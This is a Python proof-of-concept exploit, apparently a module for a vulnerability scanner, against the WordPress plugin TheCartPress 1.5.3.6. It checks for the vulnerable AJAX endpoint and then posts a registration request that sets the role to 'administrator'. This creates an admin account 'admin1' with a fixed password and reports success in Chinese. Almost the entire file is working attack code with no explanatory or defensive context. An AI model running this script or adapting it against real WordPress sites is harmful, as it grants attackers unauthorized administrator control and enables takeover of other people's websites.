# coding: utf-8
import requests
import random

def vuln_check(uri):
    response = requests.get(uri)
    raw = response.text
    if "User name is required" in raw:
        return True
    else:
        return False

#Wordpress Plugin TheCartPress 1.5.3.6 - Privilege Escalation (Unauthenticated)
def poc(url,user_agent,proxy):

    url = url.strip("/")
    ajax_action = 'tcp_register_and_login_ajax'
    admin = '/wp-admin/admin-ajax.php'
    url = url + admin + '?action=' + ajax_action
    check = vuln_check(url)
    if not check:
        return

    header = {'User-Agent': user_agent}

    data = {
        "tcp_new_user_name": "admin1",
        "tcp_new_user_pass": "123.com",
        "tcp_repeat_user_pass": "123.com",
        "tcp_new_user_email": "test@test.com",
        "tcp_role": "administrator"
    }

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.post(url, headers=header,data=data, proxies=proxies)
    else:
        response = requests.post(url, headers=header,data=data)
    print(response.text)
    if response.status_code==200:
        if (response.text == "\"\""):
            return 'Wordpress Plugin TheCartPress 1.5.3.6 - 提权提升漏洞   注册成功：admin1  123.com'
        else:
            return 'Wordpress Plugin TheCartPress 1.5.3.6 - 提权提升漏洞   注册失败：'+response.text

def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','')
